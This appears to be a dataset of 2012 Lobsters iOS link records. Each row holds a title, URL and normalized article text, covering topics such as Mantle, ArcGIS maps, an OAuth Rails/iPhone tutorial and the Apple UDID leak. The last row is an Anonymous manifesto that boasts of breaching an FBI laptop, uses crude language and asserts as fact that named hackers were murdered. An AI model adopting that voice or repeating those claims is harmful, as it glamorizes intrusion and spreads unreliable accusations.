588,Lobsters,ios,Apple iOS,GitHub's Mantle: a Model Framework for Objective-C,https://github.com/blog/1299-mantle-a-model-framework-for-objective-c,github mantle model framework objectivec,username autocompletion notification center support mantle next blog post rebel typical model object github api github issue use core data concurrency huge headache still lot boilerplate hard get right mtlmodel mtlmodel extension getting involved check readme,lately shipping github mac ever username autocompletion notification center support door releasing two framework helped make happen post talk mantle framework make dead simple create flexible easytouse model layer cocoa cocoa touch next blog post talk rebel framework improving appkit first let explore would even want framework wrong way model object usually written objectivec typical model object let use github api demonstration would one typically represent github issue objectivec typedef enum nsuinteger ghissuestateopen ghissuestateclosed ghissuestate interface ghissue nsobject nscoding nscopying property nonatomic copy readonly nsurl url property nonatomic copy readonly nsurl htmlurl property nonatomic copy readonly nsnumber number property nonatomic assign readonly ghissuestate state property nonatomic copy readonly nsstring reporterlogin property nonatomic copy readonly nsstring assigneelogin property nonatomic copy readonly nsdate updatedat property nonatomic copy nsstring title property nonatomic copy nsstring body id initwithdictionary nsdictionary dictionary end implementation ghissue nsdateformatter dateformatter nsdateformatter dateformatter nsdateformatter alloc init dateformatterlocale nslocale alloc initwithlocaleidentifier enusposix dateformatterdateformat yyyymmddthh mm s z return dateformatter id initwithdictionary nsdictionary dictionary self self init self nil return nil url nsurl urlwithstring dictionary url htmlurl nsurl urlwithstring dictionary htmlurl number dictionary number dictionary state isequaltostring open state ghissuestateopen else dictionary state isequaltostring closed state ghissuestateclosed title dictionary title copy body dictionary body copy reporterlogin dictionary user login copy assigneelogin dictionary assignee login copy updatedat selfclassdateformatter datefromstring dictionary updatedat return self id initwithcoder nscoder coder self self init self nil return nil url coder decodeobjectforkey url htmlurl coder decodeobjectforkey htmlurl number coder decodeobjectforkey number state coder decodeunsignedintegerforkey state title coder decodeobjectforkey title body coder decodeobjectforkey body reporterlogin coder decodeobjectforkey reporterlogin assigneelogin coder decodeobjectforkey assigneelogin updatedat coder decodeobjectforkey updatedat return self void encodewithcoder nscoder coder selfurl nil coder encodeobject selfurl forkey url selfhtmlurl nil coder encodeobject selfhtmlurl forkey htmlurl selfnumber nil coder encodeobject selfnumber forkey number selftitle nil coder encodeobject selftitle forkey title selfbody nil coder encodeobject selfbody forkey body selfreporterlogin nil coder encodeobject selfreporterlogin forkey reporterlogin selfassigneelogin nil coder encodeobject selfassigneelogin forkey assigneelogin selfupdatedat nil coder encodeobject selfupdatedat forkey updatedat coder encodeunsignedinteger selfstate forkey state id copywithzone nszone zone ghissue issue selfclass allocwithzone zone init issue url selfurl issue htmlurl selfhtmlurl issue number selfnumber issue state selfstate issue reporterlogin selfreporterlogin issue assigneelogin selfassigneelogin issue updatedat selfupdatedat issuetitle selftitle issuebody selfbody nsuinteger hash return selfnumberhash bool isequal ghissue issue issue iskindofclass ghissueclass return return selfnumber isequal issuenumber selftitle isequal issuetitle selfbody isequal issuebody end whew lot boilerplate something simple even problem example address url htmlurl field missing nsurl urlwithstring throw exception way update ghissue new data server way turn ghissue back json ghissuestate encoded asis enum change future existing archive might break interface ghissue change road existing archive might break use core data core data solves certain problem well need execute complex query across data handle huge object graph lot relationship support undo redo core data excellent fit however come pain point concurrency huge headache particularly difficult pas managed object thread nsmanagedobjectcontextconcurrencytypes introduced o x io really address problem instead object id passed around translated back forth highly inconvenient still lot boilerplate managed object reduce boilerplate seen core data plenty correctly setting core data stack persistent store persistent store coordinator executing fetch take many line code hard get right even experienced developer make mistake using core data framework forgiving trying access json object core data lot work little gain mtlmodel enter mtlmodel ghissue look like inheriting mtlmodel typedef enum nsuinteger ghissuestateopen ghissuestateclosed ghissuestate interface ghissue mtlmodel property nonatomic copy readonly nsurl url property nonatomic copy readonly nsurl htmlurl property nonatomic copy readonly nsnumber number property nonatomic assign readonly ghissuestate state property nonatomic copy readonly nsstring reporterlogin property nonatomic copy readonly nsstring assigneelogin property nonatomic copy readonly nsdate updatedat property nonatomic copy nsstring title property nonatomic copy nsstring body end implementation ghissue nsdateformatter dateformatter nsdateformatter dateformatter nsdateformatter alloc init dateformatterlocale nslocale alloc initwithlocaleidentifier enusposix dateformatterdateformat yyyymmddthh mm s z return dateformatter nsdictionary externalrepresentationkeypathsbypropertykey return superexternalrepresentationkeypathsbypropertykey mtldictionarybyaddingentriesfromdictionary url url htmlurl htmlurl reporterlogin userlogin assigneelogin assigneelogin updatedat updatedat nsvaluetransformer urltransformer return nsvaluetransformer valuetransformerforname mtlurlvaluetransformername nsvaluetransformer htmlurltransformer return nsvaluetransformer valuetransformerforname mtlurlvaluetransformername nsvaluetransformer statetransformer nsdictionary state open ghissuestateopen closed ghissuestateclosed return mtlvaluetransformer reversibletransformerwithforwardblock nsstring str return state str reverseblock nsnumber state return state allkeysforobject state lastobject nsvaluetransformer updatedattransformer return mtlvaluetransformer reversibletransformerwithforwardblock nsstring str return selfdateformatter datefromstring str reverseblock nsdate date return selfdateformatter stringfromdate date end notably absent version implementation nscoding nscopying isequal hash inspecting property declaration subclass mtlmodel provide default implementation method problem original example happen fixed well url htmlurl field missing nsurl urlwithstring throw exception url transformer used included mantle return nil given nil string way update ghissue new data server mtlmodel extensible mergevaluesforkeysfrommodel method make easy specify new model data integrated way turn ghissue back json ghissuestate encoded asis enum change future existing archive might break issue solved using reversible transformer ghissue externalrepresentation return json dictionary also get encoded encodewithcoder saving fragile enum value interface ghissue change road existing archive might break mtlmodel automatically save version model object used archival unarchiving migrateexternalrepresentation fromversion invoked migration needed giving convenient hook upgrade old data extension mantle also come miscellaneous crossplatform extension meant make life easier including assuredly run common pain point getting involved mantle still new moving fast may make breaking change timetotime excellent unit test coverage already used github mac production code heartily encourage check file issue find like contribute code take look readme enjoy
589,Lobsters,ios,Apple iOS,iOS Maps: Replacing MapKit with ArcGIS,https://developers.geoloqi.com/ios/maps,io map replacing mapkit arcgis,next page basemaps x corresponds longitude corresponds latitude next page,next page arcgis sdk io provides much even functionality apple standard mapkit framework vocabulary term used may unfamiliar coming mapkit apis common simple example basic replacing mapkit arcgis esri arcgis resource center good instruction accomplish see page let say standard mkmapview xib property synthesize directive interface implementation installed arcgis sdk io configured project access arcgisarcgish select delete mkmapview xib drag vanilla uiview object replace new uiview selected change class field identity inspector view utility sidebar agsmapview wire interface could build run application view would show anything since arcgis ability use many different basemaps need create agstiledmapservicelayer feed basemap want add agsmapview example chose world street map define basemapurl http serverarcgisonlinecomarcgisrestservicesworldstreetmapmapserver void viewdidload nsurl basemap nsurl urlwithstring basemapurl selfmapview addmaplayer agstiledmapservicelayer tiledmapservicelayerwithurl basemap withname tiled layer able run application see agsmapview tile loading see image zoomed way map wrap scroll mkmapview map nt wrap either easy place start agsmapview object wraparound property selfmapviewwraparound yes would also handy map started life showing u immediate vicinity entail step generified find device current location latitude longitude create box around location zoom map box step regardless using mapkit arcgis let go one bit detail corelocation fantastic albeit opaque however current purpose fine first step process type map view void viewdidload super viewdidload locationmanager private instance var locationmanager cllocationmanager new locationmanagerdelegate self locationmanager startupdatinglocation method deprecated io void locationmanager cllocationmanager manager didupdatetolocation cllocation newlocation fromlocation cllocation oldlocation nsmutablearray location nsmutablearray arraywithobject newlocation oldlocation location insertobject oldlocation self locationmanager locationmanager didupdatelocations location void locationmanager cllocationmanager manager didupdatelocations nsarray location recent last list cllocation location location objectatindex locationscount let wait get good enough fix locationhorizontalaccuracy latlng locationcoordinate todo make bounding box todo tell map zoom got good fix stop updating locationmanager stopupdatinglocation normal mapkit programming would build mkcoordinateregion data structure zoom map would replace first todo something like mkcoordinatespan value whole screen float extentdelta mkcoordinateregion region latlng mkcoordinatespan extenddelta extentdelta however gi term usually called coordinate region instead known extent envelope arcgis class named accordingly also arcgis class know another term spatial reference discussion different type spatial reference beyond scope document equivalent code using arcgis xy maxmin value represent corner float extentdelta agsenvelope envelope agsenvelope envelopewithxmin latlnglongitude extentdelta ymin latlnglatitude extentdelta xmax latlnglongitude extentdelta ymax latlnglatitude extentdelta spatialreference agsspatialreference see agsenvelope give much finer control box requiring set sw ne corner individually also note agsenvelope like many thing arcgis sdk io us x terminology instead latitude longitude important realize x corresponds longitude corresponds latitude may seem backwards first make sense mkcoordinateregion hand tell mkmapview show easily could replace second todo selfmapview setregion region animated yes equally easy acheive result agsmapview selfmapview zoomtoenvelope envelope animated yes comparison screenshots mapkit left arcgis map right next page
590,Lobsters,ios,Apple iOS,Would you like a Mobile App with That?,http://schneems.com/post/33781154129/would-you-like-a-mobile-app-with-that,would like mobile app,opro introduction oauth rail app clone one mine devise write adapter opro custom auth boot configure first client app rate limiting built documentation http iphone app http githubcomoprooprorailsdemo afnetworking mattt heroku big nerd ranch io programming io course code school http oprodemoherokuappcom rail app http oprodemoherokuappcom app way http http note http note remember cloud herokucom heroku toolbelt http note http ssl ssl http addon page finishing opro iphone app doc opro developer doc schneems heroku rail class university texas schneems raise hell better programming exception,android iphone user everywhere made abundantly clear mobile apps future come mobile nothing beat native experience native apps mean need api api need authentication happy introduce solution mobile rail backed authentication need opro opro pronounced ohpro rail engine adding oauth provider rail app oauth web authenticates service ever signed twitter connected facebook used oauth new concept check introduction oauth otherwise put programming cap cause going build first rail api backed iphone app rail app assume got rail app already burning hole pocket easily clone one mine rail app going need user model authenticate also need authentication user model opro builtin devise integration using something else easily write adapter got working app need install opro start adding code gemfile gem opro run bundle install rail g opro install put file initializersoprorb generate migration add mountoprooauth route using devise make sure authstrategy inside initializer set devise otherwise need configure custom auth adapter configauthstrategy devise next need migrate database almost done rake db migrate give u table store oauth client app credential table store access token user need configure controller allow oauth adding allowoauth controller userscontroller go ahead add give client api access ability hit action controller class userscontroller applicationcontroller allowoauth end allowoauth method accepts argument beforefilter boot configure first client app got opro set need generate client app auth token secret main rail app keep track client used whitelisting blacklisting rate limiting go ahead start local server rail server server running port view built documentation wish need visit http generate client app fill name app first api app hit enter redirected page secret token record purpose example use credential name first api app client id secret got working rail app acting oauth provider time get party started make first rail backed iphone app iphone app never coded objective c get nervous already got app start see app go http githubcomoprooprorailsdemo first need clone locally go project directory inside rail app clone repository git clone git githubcom oprooprogit move directory run cd oproiphonedemo gem install cocoapods pod install open oprodemoxcworkspace using cocoapods much like bundler install external dependency iphone app app relies excellent afnetworking written mattt heroku run xcode open make sure target application set oprodemo hit run cmdr see screen like see screen may need update xcode install io developer library change target try checking debug log output error new io programming recommend big nerd ranch io programming starting point io course code school look promising iphone demo app us rail backed opro app hosting heroku http oprodemoherokuappcom previously generated credential see open oproapiclienth define oclientbaseurlstring http oprodemoherokuappcom define oclientid define oclientsecret make sure demo work default rail app heroku pressing create random user button hit endpoint http oprodemoherokuappcom save new user database return randomly generated email password mobile app log functionality something would want app useful oauth demo server responds iphone simulator email password field filledin log button active press send email password server along client id client secret everything successful server return access token use behalf user taken new screen email twitter zip try modifying one field submitting form changing data rail server authenticated user request make access token mean acting behalf user see field update look client log see find error got working iphone app time repurpose site app way verified iphone demo app work demo heroku going modify work local rail app first make sure local rail app running rail server grab credential wrote earlier signing client application server okay go http select app write secret id purpose use name first api app client id secret remember credential different inside oproapiclienth replace http oprodemoherokuappcom http replace oclientid oclientsecret client secret using example value would define oclientbaseurlstring http define oclientid define oclientsecret note id secret different try use credential work local server different got credential iphone app rebuild pressing run hitting cmdr app build check output xcode everything worked see screen clicking create random user button work take look local rail server log verify receiving request iphone simulator receive error log using random button since create random user log need create user database using devise visit http enter email password remember email password remember sign form always make new user console rail console password password email email examplecom usercreate email email password password passwordconfirmation password userlastemail email true got user database email password enter email password field xcode entered field see log button become active pull rail server log click log button iphone simulator see request come email gave password filtered request went well see status response server iphone simulator show user edit page using demo app provided change field hit enter see request along value set hit local server note iphone app expects json response rail server user update action might need add respondto block running app zip twitter field user table get error hit enter case open edituserviewcontrollerm updateuser method see creating dictionary similar hash ruby email twitter zip field mutableuserparameters setvalue useremailfieldtext forkey email mutableuserparameters setvalue usertwitterfieldtext forkey twitter mutableuserparameters setvalue userzipfieldtext forkey zip want send twitter zip field take sending email field mutableuserparameters setvalue useremailfieldtext forkey email save rerun iphone app reenter credential try modifying email address user change schneems examplecom hit enter see new email come request server everything work also able see change database rail console userwhere email schneems examplecom congrats made first working api backed rail app using oauth still problem remember check rail log iphone simulator log log rail might use put something happened objectivec would use nslog something happened quite done demo yet might authenticated local app want every time let make sure iphone app remembers u power phone remember getting access token much good remember going see store iphone use authenticate later go ahead stop iphone simulator restart pressing run hitting cmdr come back online notice log button already active try hitting right happens see update user screen email put last time app remember open oproapiclientm take look setauthorizationwithtoken trust awhile method name look bad see storing accesstoken refreshtoken nsuserdefaults standarduserdefaults setobject accesstoken forkey kaccesstoken nsuserdefaults standarduserdefaults setobject refreshtoken forkey krefreshtoken telling iphone app store value disk even app killed restarted later pull value disk initialize api client initwithbaseurl method nsstring accesstoken nsuserdefaults standarduserdefaults objectforkey kaccesstoken nsstring refreshtoken nsuserdefaults standarduserdefaults objectforkey krefreshtoken self setauthorizationwithtoken accesstoken refreshtoken refreshtoken left write logic controller make button available user authenticated previously done oprodemoviewcontrollerm make log button clickable user previously authenticated oproapiclient sharedclient isauthenticated getaccesstokenbutton setenabled yes getaccesstokenbutton sethighlighted yes getusercredentialsbutton sethighlighted got app hit rail app act authenticated user might first app stop rip oproapiclienth oproapiclientm put custom app could modify one meet need starting point declare victory new found api client rail app let deploy production cloud got client working put app heroku anyone hit api without needing access localhost account need sign herokucom done install heroku toolbelt provision app directory rail project run heroku login heroku create creating done stack cedar http git herokucom note url app name different got heroku app provisioned need commit file git deploy run git add git commit deploy heroku git push heroku master successful push see app compiling several step bundle install rake asset precompile run done need migrate database heroku run rake db migrate hit app make sure working right visit url given earlier http problem check log running heroku log tail got app running cloud let add ssl ssl protect app people snooping credential allow encrypted communication using http iphone rail app ssl addon add heroku app provision addon go addon page run command line heroku addons add ssl endpoint app safely running heroku point iphone app production server oproapiclienth forget use http instead simply http create new oauth client app visiting website oauthnew want add id secret oproapiclienth well save user postgres database heroku make sure hitting right url always check server log heroku heroku log tail got site running heroku iphone client properly configured use iphone app production rail app pretty cool huh finishing today turned rail app oauth powered api made first native iphone app deployed server production bad afternoon work got basic learn authorization iphone app work visiting opro iphone app doc read configuration available visit opro developer doc run inaccuracy want say hi show opro powered app always find twitter schneems may oauth richard work heroku ruby team teach rail class university texas like apis much chat twitter schneems enjoyed article might also enjoy raise hell better programming exception
591,Lobsters,ios,Apple iOS,The Magazine,http://www.marco.org/2012/10/11/the-magazine,magazine,magazine magazine introductory article get app bug note,introducing magazine modern io newsstand publication geek like u loosely technology also give tech writer venue explore topic likeminded geek might find interesting magazine introductory article explains detail short version way build analyze developer always development magazine geek like u often always technology publishes four article every two week per month free trial get app start best ipad chose many reason go detail coming week finally get time write short version want publication exist reader writer publisher author work interesting challenge never tackled strong position try complement instapaper nicely writer angle particularly interesting seen lot businessmodel experimentation online publishing last decade especially last year even readability nowabandoned payment system fatally flawed practice interesting idea app store given software developer great new option accepting direct payment newsstand given publisher even bigger opportunity subscription billing prominent placement yet publisher experimenting radical change fund huge staff production cost afford deviate yesterday model individual writer make newsstand apps room another category individual major publisher magazine sits multiauthor truly modern digital magazine appeal audience bigger niche smaller readership new york time modern magazine mb stack static page image laid manually people magazine support writer basic conventional way modern web context actually seems least conventional riskiest paying write since keeping production cost low able pay writer reasonably today competitively highend print magazine future magazine get enough subscriber risk confident go bug note course already bug catch testing multiple device eg ipad iphone subscription validate first one subscribe fix approved soon meantime trying choose device suggest reading magazine ipad
593,Lobsters,ios,Apple iOS,Show iOS devs: PSTCollectionView - API compatible replacement of UICollectionView (iOS6) for iOS4.3+,https://github.com/steipete/PSTCollectionView,show io devs pstcollectionview api compatible replacement uicollectionview,pstcollectionview want use uicollectionview still need support older version io gon na love project pspdfkit current state howto help animation octogavrix arc dependency interoperability creator peter steinberger steipete contributor license,pstcollectionview update longer using pstcollectionview project purely exists keep old project alive historical reason open source api compatible replacement uicollectionview want use uicollectionview still need support older version io gon na love project originally wrote pspdfkit io pdf framework support text selection annotation project seemed way useful others keep want pstcollectionview uicollectionview use psuicollectionview basically add p uicollectionview class get autosupport older io version always want use pstcollectionview use pstcollectionview class name replace ui pst current state feature work including flow layout fixed dynamic cell size supplementary view something fancy work pstcollectionview also internally designed closely uicollectionview thus great study wondering uicollectionview work see howto helpful detail help best way already using uicollectionview somewhere add pstcollectionview try check everything work fix bug result match also pick issue fron issue tracker start working start playing around one wwdc example try make work pstcollectionview already perfect could also write pintereststyle layout manager ca nt hard animation thanks sergey gavrilyuk octogavrix animation supported perfect yet see lineexample great start arc pstcollectionview work xcode arc dependency pstcollectionview need quartzcoreframework interoperability another goal least super useful debugging interoperability uipst class uicollectionviewflowlayout flowlayout uicollectionviewflowlayout new pstcollectionview collectionview pstcollectionview alloc initwithframe selfviewbounds collectionviewlayout pstcollectionviewflowlayout flowlayout note method ca nt use underscore variant risk get falsepositive private api use added runtime hack dynamcially add block forwarders case mainly uipst interoperability creator peter steinberger steipete lot others see contributor graph thanks everyone license pstcollectionview available mit license see license file info
594,Lobsters,ios,Apple iOS,If you want to have Google maps instead of Apple maps in your app - mladjan/GoogleMapsOverlayiOS,https://github.com/mladjan/GoogleMapsOverlayiOS,want google map instead apple map app mladjangooglemapsoverlayios,googlemapsoverlayios http http wikiopenstreetmaporgwikiosminmapkit http githubcommladjangooglemapsoverlayios http wikiopenstreetmaporgwikiosminmapkit,googlemapsoverlayios solution approved apple want google map instead apple map app simple solution already saw apple made map solution implemented great unfortunately serbia unusable heard lot people country like uk map good enough city huge problem people already app appstore based google map google map api example geocoding api must used google map google map tos img src http alt taksiko google v apple map found solution implementing open street map overlay mkmapview http wikiopenstreetmaporgwikiosminmapkit downloading osm tile showing overlay made change use google map tile posted demo github http githubcommladjangooglemapsoverlayios implementation use http wikiopenstreetmaporgwikiosminmapkit thanks nutiteq team providing source code osm
596,Lobsters,ios,Apple iOS,iPhone 5 Released,http://www.apple.com/iphone/,iphone released,learn,apple card monthly installment pay new iphone month interestfree apple card learn limited time switch iphone save trade eligible android smartphone
597,Lobsters,ios,Apple iOS,New From Parse - Cloud Code,http://blog.parse.com/2012/09/11/welcoming-cloud-code-to-the-parse-family/,new parse cloud code,graphql available available security issue,glad announce parse server support graphql graphql opensource data query manipulation language help developer build fast stable apps us type ensure apps ask possible provide clear helpful error parse server easiest way instantly create graphql api amongst core team recently discussed adopting governance model make parse community transparent make decision making process clear make easier contribute project tom fox march parse platform changed lot past month departure one core contributor arrival new contributor also look back success last year work coming month florent vilmart august summer really busy dusted j sdk stripping large part legacy parsepromises backbone style callback definitely ben friedman january like take moment say thank everyone community beyond great year providing parse without everyone help ben friedman december version parse php sdk available use jump includes quite new feature among relative time query aggregate query index management ben friedman october hacktoberfest underway encourage take time sign hacktoberfest start contributing parseserver open source project github find detail signup oh mention free tshirts ben friedman september version parse php sdk available use jump includes support hhvm full text query support ben friedman july security issue recently disclosed nodejs affect version node starting line way stand security update released week ago currently available active release line including highly recommend update implementation patch issue assuming already
598,Lobsters,ios,Apple iOS,Leaked Apple UDIDs stolen from BlueToad,http://blog.bluetoad.com/2012/09/10/statement-from-bluetoad-regarding-the-cyber-attack-suffered-in-the-recent-case-of-stolen-apple-udids/,leaked apple udids stolen bluetoad,,
599,Lobsters,ios,Apple iOS,Tumblr for iOS,http://zachwill.com/tumblr-ios/,tumblr io,tumblr io update tumblr io completely native peter vidani dribbble shot crunch charles nsscreencast episode mustache mustachejs spinjs zepto tumblr api total control update actually refers storyboardtumblrcom flurry,tumblr io update tumblr io completely native updating tumblr application io coming across peter vidani dribbble shot decided take stab seeing worked ended using crunch resource file charles network traffic real voodoo involved see thing fit together covered nsscreencast episode first thing notice looking tumblr source file different mustache template yeah end html extension really noticed timeline one big uiwebview first playing around app fact awhile even finding template thought maybe post timeline uiwebview held inside native container credit credit due incredibly nice web interface since cs javascript file included source thought weird mustachejs included spinjs zepto actually make lot sense behind scene app obviously using tumblr api api actually total control timeline look feel much even highlighted ribbon staff post done via api highlighted message presenting icon http assetstumblrcomunicornpng color api sends resource time post user follow home timeline mustache template used probably grmustache create initial html document based comment app javascript file incredibly wellcommented easy read native code used detect far user scrolled reach end post api sends go mustache template become html javascript used append current timeline downside approach sure engineer aware available code really wellwritten user agressively try scrolling timeline frame rate drop pretty significantly scrolling begin feel sluggish native container like uitableview hundred thousand manhours spent performance cell reuse exact scenario user ever notice mean took couple hour realize single uiwebview even seeing static source file another downside whenever user go back timeline signifcant amount exit application take really long time reload uiwebview basically render giant html timeline post native versus html approach got admit pretty cool seeing well api mustache template mesh together basically entire logic behind home timeline displayed exists interaction two another interesting find lack nib file actually opposite airbnb source native uiview file obviously used user begin writing post along really nice tab bar animation probably written code one comment postcss file indicates storyboards use soon used sometime future update storyboard comment actually refers storyboardtumblrcom future bryan make storyboard interview look right another great takeaway engineer target retina device cs medium screen webkitmindevicepixelratio retina cs moving part application inclined believe pulltorefresh native side note really like use image throughout ui rather text also two core data momd directory included source one named stpersistentcache light testing pretty sure stpersistentcache cache image locally come across network twice least case larger image longer came wire actually make lot sense think image timeline view never accessed accessed two time must somewhat pertinent user momd includes entity make basis type post user make etc one newer entity fanmail accompanying image source unable find playing around app although interacted fan tumblr note include tumblr use flurry analytics sends applicationdidenterbackground standard stuff also minimum version supported io checked infoplist lastly could completely wrong detail crunch charles great tool seeing asset network traffic exactly view source tumblr objectivec code say cs javascript incredibly wellwritten code within couple hour able see thing fit together
601,Lobsters,ios,Apple iOS,A Mind Map for iOS Testing,http://www.neglectedpotential.com/2012/09/a-mind-map-for-ios-testing,mind map io testing,update update matthew henderson brad dillon io testing mind map zip file download previously posted ministry testing bernard simplemind free simplemind handy zip file rosie,update newer version mind map found update version mind map updated following change added ipad mini iphone hardware added inapp purchase testing software added righttoleft text input internationalization ht matthew henderson added caching data ht brad dillon io testing mind map zip file download previously posted mind map getting started mobile testing come across ministry testing website really hoping eventually see io specific one happy say bernard put together mind map testing io wanting something like serve checklist thing make sure covering least considered testing tried strike balance thorough going overboard detail think suck missed bunch important stuff bunch thing care luckily smmx file available modify heart content find feeling adventurous application used simplemind free though need grab payfor version simplemind able import existing mind map smmx file included handy zip file updated zip rosie kind enough make zip file also host useful format pdf png text opml mm
602,Lobsters,ios,Apple iOS,Apple patent could remotely disable protesters phone cameras,http://www.zdnet.com/apple-patent-could-remotely-disable-protesters-phone-cameras-7000003640/,apple patent could remotely disable protester phone camera,u patent,nt hate someone cinema taking photo talking phone unfair cheated test could access web yet got half mark nt shame ca nt take photo police officer beating man street oppressive government remotely disabled smartphone camera new patent granted apple could u patent otherwise known apparatus method enforcement policy upon wireless device granted lateaugust would allow phone policy set chang e one functional operational aspect wireless device upon occurrence certain event mean realterms preventing wireless device communicating wireless device academic setting forcing certain electronic device enter sleep mode entering sensitive area patented technology may also used restrict protester right free expression oppressive regime around world nt checked recently plenty preventing camera image video taken political rally event apple make good point voice good wireless device cellular telephone pager personal medium device smartphones become ubiquitous people carrying device various social professional setting result wireless device often annoy frustrate even threaten people sensitive venue example cell phone loud ringer frequently disrupt meeting presentation movie religious ceremony wedding funeral academic lecture testtaking environment note later covert police government operation may require complete blackout condition adding likewise airline operator airport may cause mobile device enter airplane mode wherein electromagnetic emission significance prevented least flight thereby affirmatively preventing interference aircraft communication instrumentation enhancing safety similarly terrorist threat security breach detected airport may disable least portion wireless communication within terminal using policy command thereby potentially frustrating communication individual terrorist criminal clear although apple may implement technology would apple decision activate feature remoteswitch would government business network owner set policy policy would activated gps wifi mobile basestations would ringfence geofence around building protest sensitive area prevent phone camera taking picture recording video feature email connecting nonauthorized network working office connecting nonwork network companyowned device could set example sort feature would bode well journalist taking photo citizen recording act state violence police brutality area ordinary people facing increasing crackdown civil human right one unknown variable disable connectivity cell network wifi gps connection network set featuredisabling policy first place could possible circumvent restriction question left apple reply time writing outside u business hour go almost without saying patent granted nt mean apple use technology time soon company often patent technology feature go end product lookingglass view coming next iphone ipad upcoming september announcement even line though offer view company working potential dish endconsumers business customer
603,Lobsters,ios,Apple iOS,Chinese clone maker wants to sue Apple over iPhone 5 design,http://www.neowin.net/news/chinese-clone-maker-wants-to-sue-apple-over-iphone-5-design,chinese clone maker want sue apple iphone design,shameless androidbased ripoff gizmodo gizchina,goophone chinese company behind android phone designed resemble leaked iphone part planning sue apple finalized device actually end looking like phone goophone released shameless androidbased ripoff leaked iphone prototype goophone chinese market last week mind mean went market design apple iphone actually end looking like leak seen far apple copying talk twisted logic china interesting see suit actually go anywhere even come depends whether iphone whatever apple decides call actually resembles leak seen far whether goophone willing go crazy plan whatever happens going hilarious watch copyright battle get crazier via gizmodo source gizchina image via goophone
605,Lobsters,ios,Apple iOS,FBI Says Laptop Wasn't Hacked; Never Possessed File of Apple Device IDs,http://www.wired.com/threatlevel/2012/09/fbi-says-laptop-wasnt-hacked-never-possessed-file-of-apple-device-ids,fbi say laptop nt hacked never possessed file apple device id,released encrypted file containing million apple device id lengthy post online national cyber forensics training alliance criticized rejecting application track udids check apple udid among update according apple go back top skip start article,federal bureau investigation refuting statement made member antisec weekend hacked laptop fbi special agent stole file containing million apple device id associated personal information fbi also said posse file containing data hacker said stole statement released tuesday afternoon fbi said fbi aware published report alleging fbi laptop compromised private data regarding apple udids exposed time evidence indicating fbi laptop compromised fbi either sought obtained data case emphatic enough fbi also tweeted weekend hacker group antisec released encrypted file containing million apple device id device name group said obtained fbi computer hacked hacker said original file contained million id including personal information released million leaving personal data encrypted file published torrent site lengthy post online hacker wrote last march hacked laptop belonging fbi agent named christopher k stangl bureau regional cyber action team new york fbi office evidence response team hacker say id stored file stangl desktop titled ncftaiosdevicesintelcsv file according hacker contained list million apple io device including unique device identifier udid user name name device type device apple push notification service token zip code cellphone number address hacker suggested tweet anonymousirc account fbi using information track user fbi dispute fbi say whether ncfta allegedly referred file name hacker obtained possessed data ncfta refers national cyber forensics training alliance ncfta nonprofit founded fbi agent dan larkin conduit private industry law enforcement agency help exchange data cooperate case organization member include financial institution telecommunication firm isps private industry ncfta respond call seeking comment apple udids alphanumeric string unique apple device hacker say released apple udids people would know fbi may tracking device also wrote online post think right moment release knowing apple looking alternative udid currently well case late concerned owner list apple criticized hardcoding id device since misused application developer others identify user combined information track last april apple began rejecting application track udids next web created tool user check apple udid among hacker released update apple initially declined comment story released statement fbi released statement according apple fbi requested information apple provided fbi organization additionally io introduced new set apis meant replace use udid soon banning use udid go back top skip start article
606,Lobsters,ios,Apple iOS,"1,000,001 unique Apple Device UDIDs, found on FBI laptop, released by Anonymous",http://pastebin.com/nfVT7b0Z,unique apple device udids found fbi laptop released anonymous,,know ghost unfinished business salman rushdie satanic verse ohai guise missed lot remember usual offer ask cock get free today menu share idea sometimes voice twittercom anonymousirc look news well know last long week probably le people know also testing new stuff shit next iteration whatever happy bring special fff edition special even friday utterly lulz written honest statement ofc intended truely interested reading fellow dont give fuck ideology lurking candy skip jump directly candy lulzy part titled candy lulzy part hope find useful well funny dont care whole fucking shit wtf r u go download movie go comment still waiting published news billion worth loan assad taken russia mentioned syrian mail also transfer money austrian bank etc also cock nt lazy journos look word else done word word july nsa general keith alexander alias bilderberg biddy spoke defcon hacker conference la vega wearing jean cool eff tshirt lol wtf trying seduce hacker improving internet security colonoscopy system recruit ofc future cyberwar amusing hypocritical attempt made system flatter hacker becoming tool state sorighteous employer hunt nt bow like fucking dog well got message decided help internet security auditing fbi first know make internet insecure purpose help bottom line shitty job especially since decided hunt u jail friend old double standard around since govt agency obsessed witchhunts hacker worldwide whilst also recruit hacker carry political agenda forbidden outsmart system defy work around short may hack status quo forbidden hack status quo told nt worry dirty geopolitical game business elite one give dancing order favorite general keith happily put ballet tutu dance along hacker otherwise well hagbard old murdered involved cold war spy game related kgb u tron another hacker murdered aged messing around myriad cryptographic stuff yeah usually hot item making cryptophon easily accesible mass gareth williams gchq hacker murdered bagged inside safe house hate see unsafe one look like august talking curious leaking something wikileaks fellow hacker irc list go easy cover want hacker often complex personality faking suicide fit well welcome hack system want hack punished jeremy hammond face rest productive life prison ideological motivated political dissident twice jailed following belief worked end uncover corruption connivance state big corporation denounces abuse bribe u prison system facing abuse torture hand authority last year bradley manning tortured allegedly giving wikileaks confidential data belonging u govt oh shit world nt know soldier enjoy killing people even le kill journalist course common housewife nt deserve know truth hypocrisy international diplomacy world dictator spend money luxury whilst people starve yep truth belongs elite part forget wo nt happen fuck people frustrated feel system manipulating ever never underestimate power frustrated people last year broke system belonging government big corporation find spending million tax dollar spy citizen work discredit dissenting voice pay friend overpriced insecure network service showed former govt military official making new business using government relationship funnel public money interest overpriced contract crap level service use relationship extraofficially resolve affair involving business exposed criminal system eliminating think different criminalizing system wo nt tolerate dig truth ca nt one right question anything coming system buy piece hardware software need use supposed used anything else forbidden tinkering allowed buy playstation allowed use want use sony want found way improve something shut allowed share info anyone else let make improvement real owner anything anymore borrow thing system shiny colorful thing agree play fee fee life system work keep working buy new thing important good thing buy new crap even better like everything get outdated soon home stuff car computer pay everything life time monthly fee forever die future nothing really laas life service rent life better hurry work day want stay alive work til exhausted nt think thinking bad play game instead drug go movie entertainment industry resolve philosophical trascendental problem shiny colorful crap please nt think much thinking dangerous accept offer perfect deal get amazing shiny colorful bead cost freedom life indian manhattan nothing worry lone wolf quietly outside system thing without saying word mad hell try find fucked anyway sooner later system want clearly identified personal detail well packed government database make watchdog life easier security researcher often questioned movement tracked secret service fbi shit asked project client talking know hacker etc good monkey follow rule head get coin let keep renting life hey wait hacker supposed look beyond rule find thing others nt see system yeah whole fucking system another system hack system next challenge decide whether become tool system system plan use u hold next endless war cyberwar hacker v hacker slave v slave trapped jack henry abbott writer incarcerated almost whole life crime wrote hanging long nothing ghost civil dead civil dead like autonomy systematically destroyed state word extend cover u seen autonomy systematically destroyed state becoming ghost dead civil right criminal yes criminal 